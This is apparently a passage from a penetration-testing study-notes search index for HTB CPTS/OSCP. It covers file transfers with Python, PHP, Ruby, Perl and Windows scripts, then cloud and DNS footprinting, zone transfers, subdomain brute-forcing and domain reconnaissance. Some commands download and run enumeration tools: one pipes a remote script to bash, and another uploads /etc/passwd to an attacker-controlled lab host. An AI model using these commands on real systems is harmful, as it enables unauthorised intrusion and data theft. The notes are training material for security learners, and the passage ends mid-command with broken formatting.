common programming languages.</p>"},{"location":"CPTS/File%20Transfers/transfer_files_wtih_code/#python","title":"Python","text":"<p>Python is widely used, with version 3 currently supported. However, older servers may still use Python 2.7. Python allows running one-liners from the command line using the <code>-c</code> option.</p>"},{"location":"CPTS/File%20Transfers/transfer_files_wtih_code/#python-2-download","title":"Python 2 - Download","text":"<pre><code>python2.7 -c 'import urllib;urllib.urlretrieve (\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"LinEnum.sh\")'\n</code></pre>"},{"location":"CPTS/File%20Transfers/transfer_files_wtih_code/#python-3-download","title":"Python 3 - Download","text":"<pre><code>python3 -c 'import urllib.request;urllib.request.urlretrieve(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"LinEnum.sh\")'\n</code></pre>"},{"location":"CPTS/File%20Transfers/transfer_files_wtih_code/#php","title":"PHP","text":"<p>PHP is prevalent, powering 77.4% of websites with a known server-side language. It provides several methods for file transfer and supports running one-liners using the <code>-r</code> option.</p>"},{"location":"CPTS/File%20Transfers/transfer_files_wtih_code/#php-download-with-file_get_contents","title":"PHP Download with File_get_contents()","text":"<pre><code>php -r '$file = file_get_contents(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\"); file_put_contents(\"LinEnum.sh\",$file);'\n</code></pre>"},{"location":"CPTS/File%20Transfers/transfer_files_wtih_code/#php-download-with-fopen","title":"PHP Download with Fopen()","text":"<pre><code>php -r 'const BUFFER = 1024; $fremote = fopen(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"rb\"); $flocal = fopen(\"LinEnum.sh\", \"wb\"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'\n</code></pre>"},{"location":"CPTS/File%20Transfers/transfer_files_wtih_code/#php-download-and-pipe-to-bash","title":"PHP Download and Pipe to Bash","text":"<pre><code>php -r '$lines = @file(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\"); foreach ($lines as $line_num =&gt; $line) { echo $line; }' | bash\n</code></pre>"},{"location":"CPTS/File%20Transfers/transfer_files_wtih_code/#ruby","title":"Ruby","text":"<p>Ruby supports one-liners using the <code>-e</code> option for file transfers.</p>"},{"location":"CPTS/File%20Transfers/transfer_files_wtih_code/#ruby-download-a-file","title":"Ruby - Download a File","text":"<pre><code>ruby -e 'require \"net/http\"; File.write(\"LinEnum.sh\", Net::HTTP.get(URI.parse(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\")))'\n</code></pre>"},{"location":"CPTS/File%20Transfers/transfer_files_wtih_code/#perl","title":"Perl","text":"<p>Perl is another popular language for file transfers, supporting one-liners with the <code>-e</code> option.</p>"},{"location":"CPTS/File%20Transfers/transfer_files_wtih_code/#perl-download-a-file","title":"Perl - Download a File","text":"<pre><code>perl -e 'use LWP::Simple; getstore(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"LinEnum.sh\");'\n</code></pre>"},{"location":"CPTS/File%20Transfers/transfer_files_wtih_code/#javascript","title":"JavaScript","text":"<p>JavaScript can be used for file downloads. Below is an example using Windows <code>cscript</code> to execute JavaScript.</p>"},{"location":"CPTS/File%20Transfers/transfer_files_wtih_code/#javascript-code-wgetjs","title":"JavaScript Code: <code>wget.js</code>","text":"<pre><code>var WinHttpReq = new ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");\nWinHttpReq.Open(\"GET\", WScript.Arguments(0), /*async=*/false);\nWinHttpReq.Send();\nBinStream = new ActiveXObject(\"ADODB.Stream\");\nBinStream.Type = 1;\nBinStream.Open();\nBinStream.Write(WinHttpReq.ResponseBody);\nBinStream.SaveToFile(WScript.Arguments(1));\n</code></pre>"},{"location":"CPTS/File%20Transfers/transfer_files_wtih_code/#execute-javascript-code","title":"Execute JavaScript Code","text":"<pre><code>cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1\n</code></pre>"},{"location":"CPTS/File%20Transfers/transfer_files_wtih_code/#vbscript","title":"VBScript","text":"<p>VBScript is an Active Scripting language installed by default on Windows since Windows 98.</p>"},{"location":"CPTS/File%20Transfers/transfer_files_wtih_code/#vbscript-code-wgetvbs","title":"VBScript Code: <code>wget.vbs</code>","text":"<pre><code>dim xHttp: Set xHttp = createobject(\"Microsoft.XMLHTTP\")\ndim bStrm: Set bStrm = createobject(\"Adodb.Stream\")\nxHttp.Open \"GET\", WScript.Arguments.Item(0), False\nxHttp.Send\n\nwith bStrm\n    .type = 1\n    .open\n    .write xHttp.responseBody\n    .savetofile WScript.Arguments.Item(1), 2\nend with\n</code></pre>"},{"location":"CPTS/File%20Transfers/transfer_files_wtih_code/#execute-vbscript-code","title":"Execute VBScript Code","text":"<pre><code>cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1\n</code></pre>"},{"location":"CPTS/File%20Transfers/transfer_files_wtih_code/#upload-operations-using-python-3","title":"Upload Operations using Python 3","text":"<p>Python\u2019s <code>requests</code> module can perform HTTP file uploads. Below is an example.</p>"},{"location":"CPTS/File%20Transfers/transfer_files_wtih_code/#start-the-python-upload-server","title":"Start the Python Upload Server","text":"<pre><code>python3 -m uploadserver\n</code></pre>"},{"location":"CPTS/File%20Transfers/transfer_files_wtih_code/#upload-a-file","title":"Upload a File","text":"<pre><code>python3 -c 'import requests;requests.post(\"http://192.168.49.128:8000/upload\",files={\"files\":open(\"/etc/passwd\",\"rb\")})'\n</code></pre>"},{"location":"CPTS/File%20Transfers/transfer_files_wtih_code/#breakdown-of-the-python-code","title":"Breakdown of the Python Code","text":"<pre><code>import requests\n\n# Define the target URL\nURL = \"http://192.168.49.128:8000/upload\"\n\n# Open the file to upload\nfile = open(\"/etc/passwd\",\"rb\")\n\n# Perform the upload\nr = requests.post(url,files={\"files\":file})\n</code></pre>"},{"location":"CPTS/File%20Transfers/transfer_files_wtih_code/#section-recap","title":"Section Recap","text":"<p>Understanding file transfer techniques using code can aid in red teaming, penetration testing, CTF competitions, incident response, forensic investigations, or sysadmin tasks. These examples demonstrate downloading and uploading files using various programming languages, showcasing the versatility and importance of coding in these scenarios.</p>"},{"location":"CPTS/Footprinting/Cloud%20Resources/","title":"Cloud Resources","text":"<p>[!tip]- Tips Write tips here</p>","tags":["oscp"]},{"location":"CPTS/Footprinting/Cloud%20Resources/#references","title":"References","text":"<ul> <li>Layered Enumeration Framework Guide</li> <li> <p>Comprehensive OSCP Enumeration Strategies</p> </li> <li> <p>S3 Buckets (AWS)</p> </li> <li>Blobs (Azure)</li> <li>cloud storage (GCP)</li> </ul> <p>Company Hosted Servers <pre><code>for i in $(cat subdomainlist); do host $i | grep \"has address\" | grep inlanefreight.com | cut -d \" \" -f1, 4; done\n</code></pre></p> <p>Cloud Storage in DNS Records</p> <ul> <li> <p>Purpose of Cloud Storage in DNS: Companies often add cloud storage services (e.g., Amazon S3) to DNS to streamline access for employees managing resources, allowing easy administrative access.</p> </li> <li> <p>Example Observation: During IP lookup, an IP may reveal association with cloud storage servers, such as <code>s3-website-us-west-2.amazonaws.com</code>, indicating Amazon S3 storage in use.</p> </li> <li> <p>Discovering Cloud Storage:</p> <ul> <li>Google Dorks: Use <code>inurl:</code> and <code>intext:</code> operators in Google search to locate relevant cloud storage or company assets.</li> <li>Example Use Case: Input company-specific terms (e.g., company name) with Google Dorks to refine results, potentially revealing publicly accessible storage paths.</li> <li>Additional Note: Dorking may uncover sensitive or hidden storage URLs linked to cloud services, which may be beneficial for both administrative access and security assessments.  ![[Pasted image 20241103220809.png]]</li> </ul> </li> </ul> <p>![[Pasted image 20241103220817.png]]</p> <p>![[Pasted image 20241104103338.png]]</p> <p>https://buckets.grayhatwarfare.com/ ![[Pasted image 20241104103406.png]]</p>","tags":["oscp"]},{"location":"CPTS/Footprinting/Cloud%20Resources/#private-and-public-ssh-keys-leaked","title":"Private and Public SSH Keys Leaked","text":"<p>![[Pasted image 20241104103530.png]]</p>","tags":["oscp"]},{"location":"CPTS/Footprinting/DNS%20Domain%20Name%20System/","title":"DNS","text":"<p>[!tip]- Tips Write tips here</p>","tags":["dns"]},{"location":"CPTS/Footprinting/DNS%20Domain%20Name%20System/#references","title":"References","text":"<ul> <li>Layered Enumeration Framework Guide</li> <li>Comprehensive OSCP Enumeration Strategies</li> </ul> <p>Overview DNS (Domain Name System) is a decentralized system that translates domain names (e.g., <code>www.hackthebox.com</code>) into IP addresses, allowing users to access web servers easily. Rather than a single central database, DNS data is stored across thousands of distributed servers worldwide. It is like a library of phone books, where each server holds a piece of information for global accessibility.</p> <p>Key DNS Server Types</p> <ol> <li> <p>DNS Root Server</p> <ul> <li>Role: Directs requests for top-level domains (TLDs, e.g., <code>.com</code>, <code>.org</code>).</li> <li>Description: Acts as a final referral point in the DNS query chain when other servers don\u2019t respond. ICANN manages 13 root servers worldwide.</li> <li> <p>Authoritative Name Server</p> </li> <li> <p>Role: Holds definitive records for a specific DNS zone.</p> </li> <li>Description: Provides answers directly from its designated domain\u2019s database. If it can\u2019t respond, the request escalates to the root server.</li> <li> <p>Non-Authoritative Name Server</p> </li> <li> <p>Role: Retrieves information from other DNS servers.</p> </li> <li>Description: Uses recursive or iterative queries to collect DNS zone data without direct responsibility for the zone.</li> <li> <p>Caching DNS Server</p> </li> <li> <p>Role: Temporarily stores DNS query results.</p> </li> <li>Description: Speeds up response times by caching information from authoritative servers for a set duration defined by the authoritative server.</li> <li> <p>Forwarding Server</p> </li> <li> <p>Role: Forwards DNS queries to other servers.</p> </li> <li>Description: Acts as an intermediary, forwarding DNS requests rather than resolving them directly.</li> <li> <p>Resolver</p> </li> <li> <p>Role: Locally performs name resolution on devices or routers.</p> </li> <li>Description: Resolves domain names to IP addresses within a device\u2019s or network\u2019s local system.</li> </ul> </li> </ol> <p>Security Considerations</p> <ul> <li>Encryption Methods: DNS traffic is typically unencrypted, creating privacy risks as local networks and ISPs can monitor DNS queries. Common encryption solutions include:<ul> <li>DNS over TLS (DoT)</li> <li>DNS over HTTPS (DoH)</li> <li>DNSCrypt: Encrypts DNS traffic between devices and name servers.</li> </ul> </li> </ul> <p>Additional DNS Functions</p> <ul> <li>Besides IP translation, DNS can provide other data about domain-associated services, such as:<ul> <li>Mail Server Information: Identifies email servers for the domain.</li> <li>Name Server Information: Lists servers responsible for the domain.</li> </ul> </li> </ul> <p>Summary Flow of a DNS Query</p> <ol> <li>User Request \u2192 Recursive Query \u2192 Root Server (if needed) \u2192 TLD Server \u2192 Authoritative Name Server     The system resolves domain names to IP addresses, allowing seamless web access. ![[Pasted image 20241107235120.png]]</li> </ol> <p>Different\u00a0<code>DNS records</code>\u00a0are used for the DNS queries, which all have various tasks. Moreover, separate entries exist for different functions since we can set up mail servers and other servers for a domain.</p> DNS Record Description <code>A</code> Returns an IPv4 address of the requested domain as a result. <code>AAAA</code> Returns an IPv6 address of the requested domain. <code>MX</code> Returns the responsible mail servers as a result. <code>NS</code> Returns the DNS servers (nameservers) of the domain. <code>TXT</code> This record can contain various information. The all-rounder can be used, e.g., to validate the Google Search Console or validate SSL certificates. In addition, SPF and DMARC entries are set to validate mail traffic and protect it from spam. <code>CNAME</code> This record serves as an alias for another domain name. If you want the domain www.hackthebox.eu to point to the same IP as hackthebox.eu, you would create an A record for hackthebox.eu and a CNAME record for www.hackthebox.eu. <code>PTR</code> The PTR record works the other way around (reverse lookup). It converts IP addresses into valid domain names. <code>SOA</code> Provides information about the corresponding DNS zone and email address of the administrative contact. <p>The\u00a0<code>SOA</code>\u00a0record is located in a domain's zone file and specifies who is responsible for the operation of the domain and how DNS information for the domain is managed.</p> <pre><code>dig soa www.inlanefreight.com\n</code></pre>","tags":["dns"]},{"location":"CPTS/Footprinting/DNS%20Domain%20Name%20System/#dns-default-configuration-notes","title":"DNS Default Configuration - Notes","text":"<p>Types of DNS Configuration Files</p> <ol> <li> <p>Local DNS Configuration Files</p> <ul> <li>Basic settings and options for the DNS server.</li> <li> <p>Zone Files</p> </li> <li> <p>Define specific domains and their DNS records.</p> </li> <li> <p>Reverse Name Resolution Files</p> </li> <li> <p>Used for mapping IP addresses back to domain names.</p> </li> </ul> </li> </ol> <p>Common DNS Server (Bind9 on Linux)</p> <ul> <li>Bind9 is widely used for DNS on Linux distributions.</li> <li>Main configuration file: <code>named.conf</code></li> </ul> <p>Key Configuration Files for Bind9</p> <ol> <li><code>named.conf.local</code> - Holds local domain-specific configurations.</li> <li><code>named.conf.options</code> - Contains global settings that apply to all zones.</li> <li><code>named.conf.log</code> - Manages logging settings for the DNS server.</li> </ol> <p>Configuration File Structure</p> <ul> <li><code>named.conf</code> has two main sections:<ul> <li>Options Section: Contains global settings affecting the entire server.</li> <li>Zone Entries Section: Defines settings for individual zones/domains.</li> </ul> </li> </ul> <p>Types of Options in <code>named.conf</code></p> <ul> <li>Global Options: Apply server-wide, across all zones.</li> <li>Zone Options: Specific to individual zones; override global options if both are set.</li> </ul> <p>Notes</p> <ul> <li>Unspecified options use default values.</li> <li>Zone-specific options take priority over global options when both are present. <pre><code>cat /etc/bind/named.conf.local\n</code></pre> ![[Pasted image 20241108094650.png]]</li> </ul>","tags":["dns"]},{"location":"CPTS/Footprinting/DNS%20Domain%20Name%20System/#purpose-of-namedconflocal","title":"Purpose of <code>named.conf.local</code>","text":"<ul> <li>Defines Local Zones: This file tells the DNS server which domains (zones) it is responsible for on the local network.</li> <li>Sets Up Forward and Reverse Zones: It often contains entries for forward zones (mapping domain names to IP addresses) and reverse zones (mapping IP addresses back to domain names).</li> </ul>","tags":["dns"]},{"location":"CPTS/Footprinting/DNS%20Domain%20Name%20System/#typical-content-of-namedconflocal","title":"Typical Content of <code>named.conf.local</code>","text":"<p>In this file, you\u2019ll usually find:</p> <ul> <li>Zone Definitions: Each zone definition specifies details about a domain, including its file path for the zone data (like <code>zone \"example.com\" { ... }</code>).</li> <li>Forward Zones: Defines domains for which the server will provide name-to-IP mappings.</li> <li>Reverse Zones: Defines IP address ranges for which the server will provide IP-to-name mappings.</li> </ul>","tags":["dns"]},{"location":"CPTS/Footprinting/DNS%20Domain%20Name%20System/#example-content","title":"Example Content","text":"<pre><code>zone \"example.com\" {\n    type master;\n    file \"/etc/bind/zones/db.example.com\"; \n    };  \n\nzone \"1.168.192.in-addr.arpa\" {\n    type master;\n    file \"/etc/bind/zones/db.192.168.1\"; \n\n};\n</code></pre> <ul> <li>Forward Zone (<code>example.com</code>): Maps names (like <code>www.example.com</code>) to IPs.</li> <li>Reverse Zone (<code>1.168.192.in-addr.arpa</code>): Maps IPs (like <code>192.168.1.1</code>) back to domain names.</li> </ul>","tags":["dns"]},{"location":"CPTS/Footprinting/DNS%20Domain%20Name%20System/#summary","title":"Summary","text":"<p><code>named.conf.local</code> is where you tell the Bind9 DNS server about specific domains it should manage and where to find each domain\u2019s data file. It helps the server resolve local domain names and can include both forward and reverse DNS entries. https://wiki.debian.org/Bind9</p> <pre><code>sudo apt install bind9\n\n#Zone File\ncat /etc/bind/db.domain.com\n\n# Reverse name resolution zone file\ncat /etc/bind/db.&lt;IP&gt;\n</code></pre> <p>![[Pasted image 20241108094909.png]]</p>","tags":["dns"]},{"location":"CPTS/Footprinting/DNS%20Domain%20Name%20System/#dangerous-settings","title":"Dangerous Settings","text":"<p>DNS servers are prone to vulnerabilities if not properly configured, as certain settings can unintentionally expose the server to attacks. Administrators may prioritize functionality over security, leading to misconfiguration. </p>","tags":["dns"]},{"location":"CPTS/Footprinting/DNS%20Domain%20Name%20System/#key-vulnerable-settings","title":"Key Vulnerable Settings","text":"<ol> <li> <p>allow-query</p> <ul> <li>Specifies which hosts can send requests to the DNS server.</li> <li>Misconfiguration can allow unauthorized users to access DNS data.</li> </ul> </li> <li> <p>allow-recursion</p> <ul> <li>Defines which hosts can make recursive queries to the DNS server.</li> <li>If too permissive, it allows attackers to use the server to amplify DDoS attacks.</li> </ul> </li> <li> <p>allow-transfer</p> <ul> <li>Specifies which hosts can perform zone transfers from the DNS server.</li> <li>Misconfiguration allows attackers to retrieve zone data, exposing internal network information.</li> </ul> </li> <li> <p>zone-statistics</p> <ul> <li>Collects and reports statistical data about DNS zones.</li> <li>Data collection can be useful for administrators but might expose sensitive information if accessed by unauthorized parties.</li> </ul> </li> </ol>","tags":["dns"]},{"location":"CPTS/Footprinting/DNS%20Domain%20Name%20System/#footprinting-the-dns-service","title":"Footprinting the DNS Service","text":"<ul> <li>Purpose: Footprinting helps attackers gather information about the DNS infrastructure.</li> <li>Techniques:<ul> <li>NS Record Query: Use <code>NS</code> records to identify other name servers associated with the DNS server.</li> <li>@ Character in Queries: Specify a DNS server for querying records, which can uncover differently configured servers, providing varied access to data across zones.</li> </ul> </li> </ul> <p>Summary: Misconfigured DNS settings like <code>allow-query</code>, <code>allow-recursion</code>, and <code>allow-transfer</code> create vulnerabilities. Footprinting techniques help attackers gather data on DNS servers, identifying possible weak points for further exploitation.</p>","tags":["dns"]},{"location":"CPTS/Footprinting/DNS%20Domain%20Name%20System/#dig-ns-query","title":"DIG - NS Query","text":"<pre><code>dig ns inlanefreight.htb @&lt;ip&gt;\n</code></pre> <p>Sometimes it possible to query a DNS server's version using a class <code>CHAOS</code> query and type <code>txt</code> <pre><code>dig CH TXT version.bind &lt;ip&gt;\n</code></pre></p> <p>We can use <code>any</code> option to view all available records. not all entries from the zone will be shown. <pre><code>dig any inlanefreight.htb @&lt;ip&gt;\n</code></pre></p>","tags":["dns"]},{"location":"CPTS/Footprinting/DNS%20Domain%20Name%20System/#zone-transfer-axfr-notes","title":"Zone Transfer (AXFR) Notes","text":"<p>Zone transfers are a critical process in DNS management, ensuring consistent data across DNS servers. They typically occur over TCP port 53 and are formally known as Asynchronous Full Transfer Zone (AXFR).</p>","tags":["dns"]},{"location":"CPTS/Footprinting/DNS%20Domain%20Name%20System/#key-components-and-terms","title":"Key Components and Terms","text":"<ol> <li> <p>Purpose of Zone Transfer:</p> <ul> <li>Ensures DNS consistency across multiple servers.</li> <li>Reduces the risk of service disruptions by having the same DNS data available on multiple servers.</li> <li> <p>Types of DNS Servers:</p> </li> <li> <p>Primary Name Server (Master):</p> <ul> <li>Holds the original zone data.</li> <li>Manages all updates to DNS entries (additions, modifications, deletions).</li> </ul> </li> <li>Secondary Name Server (Slave):<ul> <li>Acts as a backup, obtaining data from the master to enhance reliability.</li> <li>Helps in load balancing and protects the primary server from potential attacks.</li> </ul> </li> <li>TLD Requirement: For some Top-Level Domains, DNS zones must be accessible from at least two servers for redundancy.</li> <li> <p>How Zone Transfer Works:</p> </li> <li> <p>SOA Record (Start of Authority):</p> <ul> <li>The SOA record includes a serial number that tracks updates.</li> </ul> </li> <li>Serial Number Comparison:<ul> <li>The slave server periodically checks the master\u2019s SOA serial number to ensure it has the latest data.</li> <li>If the master\u2019s serial number is higher, the slave updates its records accordingly.</li> </ul> </li> <li> <p>Security with rndc-key:</p> </li> <li> <p>rndc-key is used to secure communication between master and slave, ensuring that only trusted servers participate in zone transfers.</p> </li> </ul> </li> </ol> <p>Summary: Zone transfers allow primary and secondary DNS servers to synchronize, maintaining data consistency and network reliability. The SOA record's serial number helps detect updates, while the rndc-key secures the transfer process.</p> <p><pre><code>dig axfr inlanefreight.htb @&lt;ip&gt;\n</code></pre> ![[Pasted image 20241108101325.png]]</p> <p>If the admin used a subnet for the <code>allow-transfer</code> option for testing purposes or as a workaround solution or set it to <code>any</code> everyone would query the entire zone file at the DNS server.</p>","tags":["dns"]},{"location":"CPTS/Footprinting/DNS%20Domain%20Name%20System/#dig-axfr-zone-transfer-internal","title":"DIG - AXFR Zone Transfer - Internal","text":"<pre><code>dig axfr internal.inlanefreight.htb @10.129.14.128\n</code></pre>","tags":["dns"]},{"location":"CPTS/Footprinting/DNS%20Domain%20Name%20System/#brute-forcing-dns-a-records-with-a-hostname-list","title":"Brute-Forcing DNS A Records with a Hostname List","text":"<p>A brute-force attack on DNS A records helps identify individual hosts within a domain by trying out various hostnames. Here\u2019s a breakdown of how this works:</p>","tags":["dns"]},{"location":"CPTS/Footprinting/DNS%20Domain%20Name%20System/#steps-for-dns-brute-forcing-with-a-records","title":"Steps for DNS Brute-Forcing with A Records","text":"<ol> <li> <p>Hostname List:</p> <ul> <li>To perform a brute-force attack, you need a list of potential subdomains or hostnames, such as <code>www</code>, <code>mail</code>, <code>ftp</code>, etc.</li> <li>SecLists: This tool offers pre-made lists of common hostnames which can be used for such purposes.</li> <li> <p>For-Loop in Bash:</p> </li> <li> <p>Using a simple loop in Bash, you can iterate over each hostname in the list and perform a DNS query.</p> </li> <li>This can be done with commands like <code>dig</code> or <code>host</code> to check if the hostname has an associated A record (IP address).</li> </ul> </li> </ol>","tags":["dns"]},{"location":"CPTS/Footprinting/DNS%20Domain%20Name%20System/#sample-bash-script","title":"Sample Bash Script","text":"<p>Here\u2019s an example of a script that uses <code>dig</code> to query each hostname in the list against a specified DNS server: <pre><code>#!/bin/bash\n\n# Specify the target domain and DNS server\ndomain=\"example.com\"\ndns_server=\"8.8.8.8\"  # Optional, specify DNS server or remove for default\n\n# Loop through the hostname list (from SecLists or other source)\nfor hostname in $(cat hostnames.txt); do\n    # Query the DNS server for each hostname\n    result=$(dig @$dns_server +short \"$hostname.$domain\")\n\n    # Check if there was an A record returned\n    if [[ -n \"$result\" ]]; then\n        echo \"$hostname.$domain has IP: $result\"\n    fi\ndone\n</code></pre></p>","tags":["dns"]},{"location":"CPTS/Footprinting/DNS%20Domain%20Name%20System/#explanation-of-the-script","title":"Explanation of the Script","text":"<ul> <li>hostname: The loop reads each hostname from <code>hostnames.txt</code>.</li> <li>dig command: Sends a DNS query for each hostname combined with the domain (e.g., <code>ftp.example.com</code>) and checks for an IP address (A record).</li> <li>Output: If an A record is found, it prints the hostname and its IP address.</li> </ul>","tags":["dns"]},{"location":"CPTS/Footprinting/DNS%20Domain%20Name%20System/#usefulness-for-penetration-testers","title":"Usefulness for Penetration Testers","text":"<ul> <li>Discover Subdomains: Reveals hidden or internal hosts that might not be publicly known.</li> <li>Attack Surface Expansion: Identifies additional points for reconnaissance or potential entry points within a target domain.</li> </ul>","tags":["dns"]},{"location":"CPTS/Footprinting/DNS%20Domain%20Name%20System/#or","title":"OR","text":"<pre><code>for sub in $(cat /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt); do\n    dig $sub.inlanefreight.htb @10.129.14.128 | grep -v ';\\|SOA' | sed -r '/^\\s*$/d' | grep $sub | tee -a subdomains.txt\ndone\n</code></pre> <ul> <li> <p>File of Subdomains: <code>cat /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt</code></p> <ul> <li>Reads a list of potential subdomains from a SecLists file. This list is used to test various subdomains against the DNS server.</li> <li> <p>Loop through Each Subdomain:</p> </li> <li> <p><code>for sub in $(cat ...); do ... done</code></p> </li> <li>For each <code>sub</code> (subdomain) in the list, the loop:<ul> <li>Executes <code>dig</code> to query for an A record of each subdomain (like <code>ftp.inlanefreight.htb</code>).</li> <li>Uses the DNS server at <code>10.129.14.128</code> for the query.</li> </ul> </li> <li> <p>Filtering and Formatting:</p> </li> <li> <p><code>grep -v ';\\|SOA'</code>: Excludes lines with semicolons (metadata) and SOA records from the <code>dig</code> output.</p> </li> <li><code>sed -r '/^\\s*$/d'</code>: Removes any blank lines.</li> <li><code>grep $sub</code>: Filters for lines that contain the queried subdomain name to show only relevant results.</li> <li> <p>Output to File:</p> </li> <li> <p><code>tee -a subdomains.txt</code>: Appends the final results to <code>subdomains.txt</code>, allowing you to keep a log of all resolved subdomains.</p> </li> </ul> </li> </ul>","tags":["dns"]},{"location":"CPTS/Footprinting/DNS%20Domain%20Name%20System/#summary-of-differences-from-the-original-script","title":"Summary of Differences from the Original Script","text":"<ul> <li>This loop has additional filters (e.g., <code>grep</code> and <code>sed</code>) to make the output cleaner by removing extraneous information and focusing on valid subdomains.</li> <li>The use of <code>tee -a</code> appends results to <code>subdomains.txt</code>, keeping a persistent record of found subdomains without needing to redirect output separately.</li> </ul>","tags":["dns"]},{"location":"CPTS/Footprinting/DNS%20Domain%20Name%20System/#in-summary","title":"In Summary","text":"<p>Both loops perform DNS queries on a list of potential subdomains, but this version includes extra filtering for cleaner output and saves results directly to a file. This is a useful addition for penetration testers, allowing for easier identification of valid subdomains in a target domain.</p> <p>Many different tools can be used for this and most of them work in the same way. one of these examples [[DNSenum]]</p> <p>https://github.com/realCheesyQuesadilla/HTBPenTest/blob/main/Footprinting</p>","tags":["dns"]},{"location":"CPTS/Footprinting/Domain%20Information/","title":"Domain Information","text":"<p>[!tip]- Tips Write tips here</p>","tags":["oscp","passive-osint","domain-enumeration","oscp-notes"]},{"location":"CPTS/Footprinting/Domain%20Information/#references","title":"References","text":"<ul> <li>ref</li> <li>ref</li> </ul>","tags":["oscp","passive-osint","domain-enumeration","oscp-notes"]},{"location":"CPTS/Footprinting/Domain%20Information/#overview","title":"Overview","text":"<ul> <li>Purpose: Gather domain information to understand the company's online presence passively</li> <li>Approach: Collect information without active scanning, mimicking customer/visitor navigation to avoid direct connections to the company.</li> </ul>","tags":["oscp","passive-osint","domain-enumeration","oscp-notes"]},{"location":"CPTS/Footprinting/Domain%20Information/#key-points","title":"Key Points","text":"<ol> <li> <p>Understanding Domain and Services:</p> <ul> <li>focus on technologies and structures necessary for company services.</li> <li>Identify service offerings (e.g., app development, IoT, hosting, etc). and use a developer's perspective to gain insights into underlying technical requirements.</li> </ul> </li> <li> <p>Analyzing Oline Presence:</p> <ul> <li>Determine company's internet footprint (e.g, ssl certificates, subdomains).</li> <li>Example scenario: Conduct a black-box test on a company with only a target scope provided.</li> </ul> </li> <li> <p>Using SSL Certificate for Enumeration:</p> <ul> <li>Examine the company's SSL certificate for subdomains and other linked domains.</li> <li>Tool: <code>crt.sh</code> for certificate transparency logs to find additional subdomains.</li> </ul> </li> <li> <p>Certificate Transparency Analysis:</p> <ul> <li>URL example:      <code>https://crt.sh/?q=inlanefreight.com</code></li> <li> <p>JSON Output:     <code>curl -s https://crt.sh/?q=inlanefreight.com&amp;output=json | jq .</code></p> </li> <li> <p>Extract unique subdomains: <pre><code>    curl -s https://crt.sh/?q=inlanefreight.com&amp;output=json | jq . | grep name | cut -d\":\" -f2 | grep -v \"CN=\" | cut -d'\"' -f2 | awk '{gsub(/\\\\n/,\"\\n\");}1;' | sort -u\n</code></pre></p> </li> </ul> </li> <li> <p>Identifying Company-Hosted Servers:</p> <ul> <li> <p>Check if subdomains are hosted by the company:</p> <p>```sh for i in $(cat subdomainlist); do host $i | grep \"has address\" | grep inlanefreight.com | cut -d\" \" -f1,4; done <pre><code>6. **Shodan for Open Port Analysis**:\n\n    - Collect IPs and analyze with Shodan for IoT and other internet-connected systems.\n    - Example commands:\n    -\n        `for i in $(cat subdomainlist); do host $i | grep \"has address\" | grep inlanefreight.com | cut -d\" \" -f4 &gt;&gt; ip-addresses.txt; done for i in $(cat ip-addresses.txt); do shodan host $i; done`\n\n7. **Gathering DNS Records**:\n\n    - Obtain DNS records to discover more hosts:\n\n\n        `dig any inlanefreight.com`\n\n### Notable Findings\n\n- **Subdomains Identified**: matomo.inlanefreight.com, smartfactory.inlanefreight.com, account.ttn.inlanefreight.com, etc.\n- **Company IPs**: 10.129.24.93, 10.129.27.33, 10.129.127.22\n- **SSL Details**: Found entries for SSLv2, SSLv3, TLSv1.1, TLSv1.2, TLSv1.3.\n- **Shodan Output**:\n    - Example IP `10.129.24.93` shows open ports 80/tcp and 443/tcp (nginx).\n    - Example IP `10.129.27.33` with OpenSSH, nginx, TLS configurations.\n\n### A Records\n\n- **Purpose**: Resolves (sub)domain names to IP addresses.\n- **Findings**: Only one IP address was found, which was already known.\n\n### MX Records\n\n- **Purpose**: Identifies the mail server responsible for handling emails for the domain.\n- **Findings**: Google handles the mail server, confirming that email management uses Gmail. Further analysis is skipped.\n\n### NS Records\n\n- **Purpose**: Indicates which name servers resolve the domain's FQDN (Fully Qualified Domain Name) to IP addresses.\n- **Findings**: Name servers were likely associated with the hosting provider, which can reveal the provider\u2019s identity.\n\n### TXT Records\n\n- **Purpose**: Contains various types of data, such as third-party verification keys and security records.\n- **Key Findings**:\n    - **SPF, DMARC, DKIM**: Security-focused DNS records for email verification.\n    - **Verification Records**:\n        - `google-site-verification`: `O7zV5-xFh_jn7JQ31`, `bow47-er9LdgoUeah`, `gZsCG-BINLopf4hr2`\n        - `atlassian-domain-verification`: `IJdXMt1rKCy68JFszSdCKVpwPN`\n        - `logmein-verification-code`: `87123gff5a479e-61d4325gddkbvc1-b2bnfghfsed1-3c789427sdjirew63fc`\n        - `MS=ms92346782372`: Likely an identifier or user ID for a domain management platform.\n\n### Notable Platforms and Services Identified\n\n- **Atlassian**: Used for software development and collaboration.\n- **Google Gmail**: Indicates the use of Google\u2019s email service, suggesting potential GDrive accessibility for open resources.\n- **LogMeIn**: Used for centralized remote access management; could provide system-wide access if administrator credentials are obtained.\n- **Mailgun**: Offers email APIs; potential target for API vulnerabilities like IDOR, SSRF, and other HTTP methods (e.g., POST, PUT).\n- **Outlook**: Suggests use of Office 365 and potentially Azure storage, which may include SMB protocol-based Azure File Storage.\n- **INWX**: Likely the domain's hosting provider, with \"MS\" as a verification identifier potentially linked to an account username.\n\n### IP Addresses Found\n\n- **Additional IPs**:\n    - `10.129.24.8`\n    - `10.129.27.2`\n    - `10.72.82.106`\n\n### Observations\n\n- TXT records revealed extensive information on third-party services and systems in use.\n- Various email and remote management services are in use, posing potential entry points if security measures are weak.\n-\n### Commands\n- json format\n\n```shell\ncurl -s 